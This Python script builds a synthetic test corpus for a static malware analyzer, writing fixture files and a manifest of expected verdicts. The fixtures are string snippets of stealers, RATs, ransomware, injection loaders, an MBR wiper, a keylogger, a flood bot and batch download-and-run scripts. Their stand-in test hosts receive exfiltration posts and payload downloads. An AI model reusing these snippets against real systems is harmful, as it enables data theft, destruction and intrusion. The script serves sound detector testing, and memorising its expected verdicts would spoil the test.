"""Build the Event Zero every-family verification corpus.

Every fixture is synthetic and disarmed by construction: network atoms
are .invalid names or TEST-NET addresses (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24) only, miner pools are lab addresses, crypto atoms act on
sacrificial lab files in the text of the fixture, headers are neutral
text or minimal lab structures, and nothing in the corpus mines,
cracks, or attacks. The fixtures carry proof atoms as data for a
static analyzer; they are never executed by the verification run.

Usage: python3 build_corpus.py [output_dir]
Writes the fixture files and manifest.json (expected verdict, reason
class or case state, family, tier, and the proof atoms the independent
scorer must find in the fixture bytes).
"""
import base64, hashlib, json, os, struct, sys, zipfile

HERE = os.path.dirname(os.path.abspath(__file__))

STEALER_CONFIG = """; lab stealer fixture (atoms only, never executed)
[collect]
Software\\Google\\Chrome\\User Data\\Default\\Login Data
Software\\Google\\Chrome\\User Data\\Default\\Cookies
%APPDATA%\\Exodus\\exodus.wallet
%APPDATA%\\Electrum\\wallets
C:\\lab\\vault.kdbx
keyMaterial = takeMasterSecret()
archive = ZipFile("loot.zip")
browserRunning = processList contains chrome.exe
ScanningArgs = new StealerConfig(new HostPort("198.51.100.23", 9001), new ClientInfo(42), new BuildInfo("lab"))
"""
STEALER_CHAIN = """import os, zipfile
from ctypes import windll
blob = CryptUnprotectData(open(r"C:\\Users\\lab\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data","rb").read())
db = sqlite3.connect(r"C:\\Users\\lab\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data")
w = open(r"C:\\Users\\lab\\AppData\\Roaming\\Exodus\\exodus.wallet","rb").read()
with zipfile.ZipFile("loot.zip","w") as z: z.write("loot.txt")
import urllib.request; urllib.request.urlopen("http://198.51.100.24/loot", data=b"x")
"""
RAT = """# lab rat fixture
import socket, subprocess
HOST, PORT = "198.51.100.30", 4443
commands = ["shell", "download", "upload", "persist", "screenshot", "keylog"]
def dispatch(cmd, arg):
    if cmd == "shell": return subprocess.run(arg, shell=True)
    if cmd == "download": return open(arg, "rb").read()
    if cmd == "upload": return open(arg, "wb").write(b"")
    if cmd == "persist": return True
    if cmd == "screenshot": return True
    if cmd == "keylog": return True
"""
RANSOM = """import os
from Crypto.Cipher import AES
KEY = b"labkeymaterial0123456789abcdef"
for root, dirs, files in os.walk("C:\\\\Users\\\\lab\\\\Documents"):
    for name in files:
        if name.endswith((".docx", ".xlsx", ".pdf", ".jpg")):
            p = os.path.join(root, name)
            data = open(p, "rb").read()
            open(p + ".locked", "wb").write(AES.new(KEY, AES.MODE_CBC).encrypt(data))
            os.remove(p)
open("README_RESTORE.txt", "w").write("Your files are encrypted. Pay 0.5 BTC to recover them. Contact restore@evil.invalid")
os.system("vssadmin Delete Shadows /all /quiet")
"""
MINER_HIDDEN = """; lab miner fixture
pool = stratum+tcp://198.51.100.40:3333
wallet = 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A
xmrig --config pool.json --hidden
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d miner.exe
windowStyle = Hidden
"""
LOADER_INJECT = """import ctypes, urllib.request
data = urllib.request.urlopen("http://198.51.100.50/payload.bin").read()
h = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, 4242)
addr = ctypes.windll.kernel32.VirtualAllocEx(h, None, len(data), 0x3000, 0x40)
ctypes.windll.kernel32.WriteProcessMemory(h, addr, data, len(data), None)
ctypes.windll.kernel32.CreateRemoteThread(h, None, 0, addr, None, 0, None)
"""
DEAD_DROP = """import base64, ctypes, urllib.request
page = urllib.request.urlopen("https://pastebin.com/raw/labdead").read()
payload = base64.b64decode(page)
buf = ctypes.create_string_buffer(payload, len(payload))
ctypes.windll.kernel32.VirtualAlloc(None, len(payload), 0x3000, 0x40)
ctypes.windll.ntdll.RtlMoveMemory(buf, payload, len(payload))
"""
BOTNET = """import socket, struct
def udp_flood(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True: s.sendto(b"X" * 1024, (target, 80))
def syn_flood(target):
    while True: struct.pack("!HH", 1, 2)
C2 = "198.51.100.60"
commands = ["flood", "stop", "update", "shell"]
def dispatch(cmd):
    if cmd == "flood": udp_flood(C2)
"""
BOOTKIT = """; lab bootkit fixture
target = EFI\\Microsoft\\Boot\\bootmgfw.efi
write(target, patched_loader)
disable SecureBoot verification
patch AME / integrity checks in boot chain
load unsigned driver at boot
"""
KEYLOGGER = """import ctypes
state = ctypes.windll.user32.GetAsyncKeyState(65)
title = ctypes.windll.user32.GetForegroundWindowText()
log = open(r"C:\\ProgramData\\.hidden\\keys.log", "a")
log.write(title + chr(65))
"""
BANKING = """; lab banking fixture
targets:
https://www.bankofamerica.com/login
https://www.chase.com/auth
https://online.wellsfargo.com/login
https://www.citi.com/login
hook = WebInject
formgrab = true
"""
PROXY_OP = """; lab proxy fixture
enrol = http://198.51.100.70/enrol?aff=LAB
peer2profit-sdk embedded
service runs as SYSTEM
netsh advfirewall firewall add rule name=px dir=in allow
pawns.app resident proxy, beneficiary = operator wallet
"""
PPI = """; lab ppi fixture
affiliate_id = AFF-8842-LAB
on install complete: GET http://198.51.100.80/callback?aff=AFF-8842-LAB&done=1
bundle: browser toolbar, system optimizer, crypto miner trial
"""
HIJACKER = """; lab hijacker fixture
set homepage = http://search.evil.invalid/
set default search provider = evilsearch
watchdog: if homepage changed, restore evil.invalid
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v guard /d hijack.exe
"""
WIPER = """import ctypes
h = ctypes.windll.kernel32.CreateFileW("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0, None, 3, 0, None)
ctypes.windll.kernel32.WriteFile(h, b"\\x00" * 512, 512, None, None)
# overwrite MBR sector 0
"""
FILELESS_PAYLOAD_B64 = base64.b64encode(b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.99/stage2') ; lab fileless payload text, long enough to be a real blob token for the parser").decode()
FILELESS_OK = ("WMI = \"__EventFilter binding to a CommandLineEventConsumer\"\n"
               "RUN = \"powershell -EncodedCommand " + FILELESS_PAYLOAD_B64 + "\"\n")
FILELESS_BLOB = "A" * 300
SCRIPT_BAD = """@echo off
cscript C:\\Windows\\System32\\slmgr.vbs /skms kms.lab.invalid
cscript C:\\Windows\\System32\\slmgr.vbs /ato
powershell -c "Invoke-WebRequest http://198.51.100.90/evil.exe -OutFile %TEMP%\\evil.exe"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v bad /d %TEMP%\\evil.exe
"""
SCRIPT_KMS = """@echo off
cscript C:\\Windows\\System32\\slmgr.vbs /skms kms.lab.invalid
cscript C:\\Windows\\System32\\slmgr.vbs /ato
schtasks /create /tn "Activation Renewal" /tr "cscript C:\\Windows\\System32\\slmgr.vbs /ato" /sc daily
"""
KEYGEN_CLEAN = "import hashlib\n# keygen\nprint('serial:', hashlib.md5(b'x').hexdigest()[:8])\n"
PASSMGR = """# friendly password manager
from cryptography.fernet import Fernet
class Vault:
    def unlock(self, master):
        return Fernet(master).decrypt(open("C:\\\\Users\\\\lab\\\\Documents\\\\MyPasswords.kdbx","rb").read())
    def save(self, path="C:\\\\Users\\\\lab\\\\Documents\\\\MyPasswords.kdbx"):
        pass
"""
MINER_DISCLOSED = """# My Miner Setup
# This is my own XMRig build. It mines to my own wallet on my own pool server at home.
wallet = 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A
pool = stratum+tcp://192.0.2.55:3333
xmrig --config my-rig.json
# run it in a visible console window so I can watch the hashrate
"""
BACKUP_TWIN = """import os
from Crypto.Cipher import AES
# Nightly backup: encrypt new documents to the backup drive, then remove the local temp copies.
for name in os.listdir("C:\\\\Users\\\\lab\\\\Documents"):
    if name.endswith((".docx", ".pdf")):
        data = open(name, "rb").read()
        open("E:\\\\Backups\\\\" + name + ".bak", "wb").write(AES.new(b"mybackupkey0123456789abcdef01", AES.MODE_CBC).encrypt(data))
        os.remove("C:\\\\Users\\\\lab\\\\Temp\\\\" + name)
print("backup complete")
"""
PROXY_DISCLOSED = """# Honeygain-style earnings app (my account)
# I run this on my home PC to sell my unused bandwidth. It shows a tray icon and a dashboard.
# Earnings go to my own account. Support: help@honeygain.invalid
app name = BandwidthShare
runs in a visible window with a dashboard and a quit button
"""
CAPTURE_TWIN = """# accessibility screen reader helper
import ctypes
state = ctypes.windll.user32.GetAsyncKeyState(9)
img = ImageGrab.grab()
notes = open("C:\\\\Users\\\\lab\\\\Documents\\\\accessibility-notes.txt", "a")
"""
XMRIG_ALONE = """; someone packed the stock miner binary alone
xmrig 6.21.0
stratum+tcp://192.0.2.99:4444
"""
ROOTKIT_SYS = "MZ lab driver bytes DriverEntry PsSetCreateProcessNotifyRoutine KeServiceDescriptorTable SSDT hook"
LOGIC_BOMB = """import datetime, subprocess
if datetime.date.today() > datetime.date(2030, 1, 1):
    subprocess.run(["opaque-arm-7f3a.bin"])
payload = open("arm.bin", "rb").read()  # contents not statically classifiable
"""
FILELESS_BAD_BLOB = ("WMI = \"__EventFilter binding to a CommandLineEventConsumer\"\n"
                     "RUN = \"powershell -EncodedCommand " + FILELESS_BLOB + "\"\n")
SERVER_KEYED = """import ctypes, urllib.request
key = urllib.request.urlopen("http://198.51.100.55/getkey?id=lab").read()
data = urllib.request.urlopen("http://198.51.100.55/payload_url").read()
buf = ctypes.create_string_buffer(data, len(data))
ctypes.windll.kernel32.VirtualAlloc(None, len(data), 0x3000, 0x40)
"""
BANKING_ARTICLE = """Banking trojans in the news, explained for readers.
Security reporters this week described stealers that watch for banking sites.
The article mentions several banks by name for context:
Bank of America (bankofamerica.com), JPMorgan Chase (chase.com),
Wells Fargo (wellsfargo.com), and Citibank (citi.com) were all named in vendor blogs.
No code is included in this article; it is reporting, not software.
"""
SURPRISE_UPDATER = """@echo off
rem totally normal updater
powershell -c "Invoke-WebRequest http://203.0.113.15/update.exe -OutFile %TEMP%\\update.exe"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d %TEMP%\\update.exe
start %TEMP%\\update.exe
"""
SURPRISE_SHADOW = """@echo off
vssadmin Delete Shadows /all /quiet
bcdedit /set {default} recoveryenabled No
curl http://203.0.113.16/stage2.bin -o %TEMP%\\stage2.bin
"""
DLL_STEALER_HOST = "MZ lab host executable, nothing else inside"


def pe_with_body(body, extra_strings=b"", section=b".text"):
    """Minimal valid PE construction, the same shape the test suite uses."""
    dos = bytearray(0x80); dos[0:2] = b"MZ"; struct.pack_into("<I", dos, 0x3c, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 240, 0x22)
    opt = bytearray(240); struct.pack_into("<H", opt, 0, 0x20b); struct.pack_into("<I", opt, 16, 0x1000)
    sec = bytearray(40); sec[0:len(section)] = section; struct.pack_into("<IIII", sec, 8, 100, 0x1000, 512, 512)
    b = (body + extra_strings).ljust(512, b"\x00")
    return bytes(dos) + b"PE\x00\x00" + coff + bytes(opt) + bytes(sec) + b

def pe_with_cert(body, extra_strings=b""):
    """The same PE with a certificate table entry at the standard offset."""
    data = bytearray(pe_with_body(body, extra_strings))
    cert_off = len(data)
    data += b"\x00" * 16
    struct.pack_into("<II", data, 0x128, cert_off, 16)
    return bytes(data)

def make_beacon():
    recs = [(1, struct.pack(">H", 1)), (2, struct.pack(">H", 8443)), (3, struct.pack(">I", 45000)),
            (5, struct.pack(">H", 15)), (8, b"c2.lab.invalid\x00"), (9, b"Mozilla/5.0 (lab)\x00"),
            (10, b"/submit.php\x00"), (7, bytes(range(256))), (26, b"rundll32.exe\x00"),
            (36, struct.pack(">I", 123456789))]
    blob = b""
    for t, v in recs:
        blob += struct.pack(">HH", t, len(v)) + v
        blob += b"\x00" * ((8 - (len(v) % 8)) % 8)
    for key in (0x69, 0x2E):
        enc = bytes(b ^ key for b in blob)
        cand = b"LABHDR" + b"\x00" * 10 + enc + b"\x00" * 64
        if b"c2.lab.invalid" not in cand:
            return cand
    return cand

def write(outdir, name, content, mode="wb"):
    p = os.path.join(outdir, name)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if isinstance(content, str):
        content = content.encode()
    with open(p, mode) as f:
        f.write(content)
    return p

def encrypted_zip(path):
    z = zipfile.ZipFile(path, "w")
    z.writestr("payload.exe", b"MZ lab payload")
    z.close()
    data = bytearray(open(path, "rb").read())
    i = data.find(b"PK\x03\x04")
    struct.pack_into("<H", data, i + 6, struct.unpack_from("<H", data, i + 6)[0] | 0x1)
    j = data.find(b"PK\x01\x02")
    struct.pack_into("<H", data, j + 8, struct.unpack_from("<H", data, j + 8)[0] | 0x1)
    open(path, "wb").write(bytes(data))

def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else os.path.join(HERE, "files")
    os.makedirs(outdir, exist_ok=True)
    entries = []
    def add(name, content, expected, family, tier=1, atoms=(), chain="", note=""):
        write(outdir, name, content)
        entries.append({"name": name, "path": name, "expected": expected, "family": family,
                        "tier": tier, "atoms": list(atoms), "chain": chain, "note": note})
    P = {"verdict": "YES", "reason_class": "PROVEN"}
    N = {"verdict": "NO", "reason_class": "ACCOUNTED"}
    O = {"verdict": "YES", "reason_class": "UNACCOUNTED", "case_state": "OPEN"}
    add("stealer_config.py", STEALER_CONFIG, P, "stealer", atoms=["Login Data", "ScanningArgs"], chain="stealer")
    add("stealer_chain.py", STEALER_CHAIN, P, "stealer", atoms=["CryptUnprotectData", "exodus.wallet"], chain="stealer")
    add("rat_dispatcher.py", RAT, P, "rat", atoms=["dispatch", "198.51.100.30"], chain="rat")
    add("ransomware.py", RANSOM, P, "ransomware", atoms=["README_RESTORE.txt", "vssadmin Delete Shadows"], chain="ransomware")
    add("miner_hidden.py", MINER_HIDDEN, P, "miner", atoms=["stratum+tcp://198.51.100.40", "Hidden"], chain="miner")
    add("loader_inject.py", LOADER_INJECT, P, "loader", atoms=["VirtualAllocEx", "198.51.100.50"], chain="loader")
    add("loader_dead_drop.py", DEAD_DROP, P, "loader", atoms=["pastebin.com/raw", "VirtualAlloc"], chain="dead-drop")
    add("server_keyed.py", SERVER_KEYED, P, "server-keyed", atoms=["getkey", "payload_url"], chain="loader", note="verdict YES-PROVEN for the loader; the family note must record that a server-delivered stage cannot be accounted")
    add("botnet_flood.py", BOTNET, P, "botnet", atoms=["udp_flood", "198.51.100.60"], chain="botnet")
    add("bootkit.py", BOOTKIT, P, "bootkit", atoms=["bootmgfw.efi", "SecureBoot"], chain="bootkit")
    add("keylogger_stash.py", KEYLOGGER, P, "keylogger", atoms=["GetAsyncKeyState", ".hidden"], chain="keylogger")
    add("banking_targets.py", BANKING, P, "banking", atoms=["bankofamerica.com", "chase.com"], chain="banking")
    add("proxy_operator.py", PROXY_OP, P, "proxy", atoms=["peer2profit", "SYSTEM"], chain="proxy")
    add("ppi_callback.py", PPI, P, "ppi", atoms=["AFF-8842-LAB", "callback"], chain="ppi")
    add("hijacker.py", HIJACKER, P, "adware-hijacker", atoms=["evil.invalid", "watchdog"], chain="hijacker")
    write(outdir, "beacon_config.bin", make_beacon())
    entries.append({"name": "beacon_config.bin", "path": "beacon_config.bin", "expected": P, "family": "beacon",
                    "tier": 1, "atoms": [], "chain": "beacon", "note": "config is XOR-encoded in the bytes by construction; the scorer checks the parsed config in the report instead of raw atoms"})
    add("wiper.py", WIPER, P, "wiper", atoms=["PhysicalDrive0"], chain="wiper")
    add("fileless_decodable.py", FILELESS_OK, P, "fileless", atoms=["EncodedCommand", "__EventFilter"], chain="fileless")
    add("script_bad.bat", SCRIPT_BAD, P, "malicious-script", atoms=["slmgr.vbs", "198.51.100.90"], chain="script")
    # folder fixture: sideload triad
    tri = os.path.join(outdir, "sideload_folder")
    os.makedirs(tri, exist_ok=True)
    write(tri, "game.exe", pe_with_cert(b""))
    write(tri, "dinput8.dll", "MZ lab replacement dll: version.dll proxy exports, DllMain runs the sidecar payload, CreateProcessW shell")
    write(tri, "data.bin", bytes(range(200)))
    entries.append({"name": "sideload_folder", "path": "sideload_folder", "expected": P, "family": "sideload",
                    "tier": 1, "atoms": [], "chain": "sideload", "note": "folder fixture: signed exe, unsigned same-folder dll, encrypted sidecar"})
    # FP twins and benign controls (Tier 1, expected NO)
    add("twin_password_manager.py", PASSMGR, N, "stealer-fp-twin", atoms=["MyPasswords.kdbx"])
    add("twin_miner_disclosed.py", MINER_DISCLOSED, N, "miner-fp-twin", atoms=["my own wallet"])
    add("twin_backup_encryptor.py", BACKUP_TWIN, N, "ransomware-fp-twin", atoms=["Nightly backup"])
    add("twin_kms_clean.bat", SCRIPT_KMS, N, "script-fp-twin", atoms=["slmgr.vbs"])
    add("twin_proxy_disclosed.py", PROXY_DISCLOSED, N, "proxy-fp-twin", atoms=["my own account"])
    add("twin_keygen.py", KEYGEN_CLEAN, N, "keygen-control", atoms=["keygen"])
    add("twin_capture_tool.py", CAPTURE_TWIN, N, "keylogger-fp-twin", atoms=["accessibility-notes.txt"])
    add("twin_xmrig_alone.py", XMRIG_ALONE, N, "miner-presence-control", atoms=["xmrig"], note="miner presence alone is not proof and nothing here is hidden or unaccounted")
    # FP twin for sideloading, in the form the research defines it: the
    # release is judged against the genuine reference, and the emulator
    # DLL is hash-matched to the genuine one, so the triad never fires
    dll_bytes = pe_with_body(b"\x90" * 8, b"SteamAPI_Init steam_api emulator\x00")
    prog = 'KEY = "AAAA"\nprint("welcome, licensed user")\n'
    for sub in ("sideload_genuine", "sideload_genuine_ref"):
        write(outdir, sub + "/steam_api64.dll", dll_bytes)
        write(outdir, sub + "/game.py", prog)
    entries.append({"name": "sideload_genuine", "path": "sideload_genuine", "reference_path": "sideload_genuine_ref",
                    "expected": N, "family": "sideload-fp-twin",
                    "tier": 1, "atoms": [], "chain": "", "note": "folder fixture with genuine reference: the emulator dll is hash-matched to the genuine dll, so it accounts as genuine and the sideload triad never fires"})
    # Designed-OPEN cases (Tier 2, disclosed): the fail-closed headline with an open ledger is the CORRECT outcome here
    add("open_rootkit.sys", ROOTKIT_SYS, O, "rootkit", tier=2, atoms=["SSDT"], note="designed OPEN: an unexplained driver in a crack can never be accounted statically")
    add("open_logic_bomb.py", LOGIC_BOMB, O, "logic-bomb", tier=2, atoms=["2030"], note="designed OPEN: opaque arm behind a date gate")
    add("open_fileless_blob.py", FILELESS_BAD_BLOB, O, "fileless", tier=2, atoms=["EncodedCommand"], note="designed OPEN: persistence executor with an undecodable blob")
    enc = os.path.join(outdir, "open_password_archive.zip")
    encrypted_zip(enc)
    entries.append({"name": "open_password_archive.zip", "path": "open_password_archive.zip", "expected": O, "family": "archive",
                    "tier": 2, "atoms": [], "chain": "", "note": "designed OPEN: an encrypted archive member cannot be accounted"})
    # Surprise fixtures, designed cold after the rules were written
    add("surprise_updater.bat", SURPRISE_UPDATER, P, "surprise-loader-script", atoms=["203.0.113.15", "Run"], chain="script", note="surprise: loader behaviour in a plain batch updater")
    add("surprise_shadow.bat", SURPRISE_SHADOW, P, "surprise-anti-recovery-script", atoms=["vssadmin Delete Shadows", "203.0.113.16"], chain="script", note="surprise: anti-recovery plus staging in a batch file")
    write(outdir, "surprise_dll_stealer/game.exe", pe_with_body(b""))
    write(outdir, "surprise_dll_stealer/helper.dll", STEALER_CONFIG)
    entries.append({"name": "surprise_dll_stealer", "path": "surprise_dll_stealer", "expected": P, "family": "surprise-stealer-in-dll",
                    "tier": 1, "atoms": [], "chain": "stealer", "note": "surprise: stealer config atoms carried in a DLL inside a release folder"})
    add("surprise_banking_article.txt", BANKING_ARTICLE, N, "surprise-banking-fp", atoms=["bankofamerica.com"], note="surprise: bank names in a news article (a non-executable text file) are content, not code")
    manifest = {"corpus": "event-zero-verification-corpus/1",
                "rule": "PASS requires: zero mismatches overall, zero unexpected UNACCOUNTED on Tier-1 fixtures, zero false NO. Tier-2 entries are designed-OPEN cases, disclosed here in advance.",
                "entries": entries}
    with open(os.path.join(HERE, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2)
    print(f"corpus built: {len(entries)} entries in {outdir}")

if __name__ == "__main__":
    main()
